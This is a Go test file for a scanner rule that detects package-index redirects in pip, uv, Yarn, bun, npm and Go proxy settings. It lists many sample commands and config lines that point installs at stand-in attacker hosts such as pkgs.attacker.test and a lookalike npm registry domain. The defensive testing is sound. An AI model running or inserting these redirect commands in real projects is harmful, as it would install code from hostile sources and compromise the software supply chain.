package rules

import "testing"

// SG-DEP-008 polish: the redirect forms the first cut missed (pip's short
// `-i`, pip.conf / pip config, uv's own flags and env, Yarn Berry, bun, an
// exported GOPROXY), and the canonical-index carve-out, which used to be a bare
// substring: `test.pypi.org/simple` contains `pypi.org/simple`, and any line
// that merely mentioned a canonical URL — beside a real redirect, or in a
// trailing comment — was suppressed whole.
func TestIndexRedirectCoversToolVariants(t *testing.T) {
	packs, _ := Builtin()
	var r *Rule
	for _, p := range packs {
		for _, rr := range p.Rules {
			if rr.ID == "SG-DEP-008" {
				r = rr
			}
		}
	}
	if r == nil {
		t.Fatal("SG-DEP-008 not found")
	}
	cases := []struct {
		text string
		want bool
	}{
		// pip: short flag, persisted config, config file.
		{"pip install -i https://pkgs.attacker.test/simple acme-utils", true},
		{"python3 -m pip install -i https://pkgs.attacker.test/simple/ acme", true},
		{"pip config set global.index-url https://pkgs.attacker.test/simple", true},
		{"pip config --user set global.extra-index-url https://pkgs.attacker.test/simple", true},
		{"index-url = https://pkgs.attacker.test/simple", true},
		{"extra-index-url=https://pkgs.attacker.test/simple", true},
		// uv: its own flags and env, outside `uv pip`.
		{"uv add --index https://pkgs.attacker.test/simple acme", true},
		{"uv sync --default-index https://pkgs.attacker.test/simple", true},
		{"uv tool install --extra-index-url https://pkgs.attacker.test/simple acme", true},
		{"export UV_INDEX_URL=https://pkgs.attacker.test/simple", true},
		{"export UV_DEFAULT_INDEX=https://pkgs.attacker.test/simple", true},
		// Yarn Berry, bun, an exported Go proxy.
		{`npmRegistryServer: "https://npm.attacker.test"`, true},
		{"yarn config set npmRegistryServer https://npm.attacker.test", true},
		{"bun add acme --registry https://npm.attacker.test", true},
		{"export BUN_CONFIG_REGISTRY=https://npm.attacker.test", true},
		{"export GOPROXY=https://goproxy.attacker.test,direct", true},
		// TestPyPI accepts uploads from anyone; it is not the canonical index.
		{"pip install --index-url https://test.pypi.org/simple/ acme-utils", true},
		// A canonical URL elsewhere on the line no longer suppresses the redirect.
		{"pip install --index-url https://pypi.org/simple --extra-index-url https://pkgs.attacker.test/simple acme", true},
		{"pip install --extra-index-url https://pkgs.attacker.test/simple acme  # mirrors https://pypi.org/simple", true},
		{"export GOPROXY=https://goproxy.attacker.test,https://proxy.golang.org,direct", true},
		{"registry=https://registry.npmjs.org.attacker.test/", true},

		// Benign: ordinary installs and flags that only look alike.
		{"pip install -r requirements.txt", false},
		{"pip install -e .", false},
		{"pip install -U pip", false},
		{"uv add requests", false},
		{"uv sync --frozen", false},
		{"bun add zod", false},
		{"export GOPROXY=direct", false},
		{"Set `index-url` in pip.conf only if your organisation runs a mirror.", false},
		// The canonical indexes, alone on the line.
		{"pip install -i https://pypi.org/simple requests", false},
		{"pip install --index-url https://pypi.org/simple/ -r requirements.txt", false},
		{"pip config set global.index-url https://pypi.org/simple", false},
		{"uv add --default-index https://pypi.org/simple acme", false},
		{"npm config set registry https://registry.npmjs.org/", false},
		{`npmRegistryServer: "https://registry.yarnpkg.com"`, false},
		{"export GOPROXY=https://proxy.golang.org,direct", false},
	}
	for _, c := range cases {
		for _, target := range []string{"scripts", "body"} {
			got := len(r.Evaluate(target, c.text)) > 0
			if got != c.want {
				t.Errorf("%s %q: got match=%v want %v", target, c.text, got, c.want)
			}
		}
	}
}
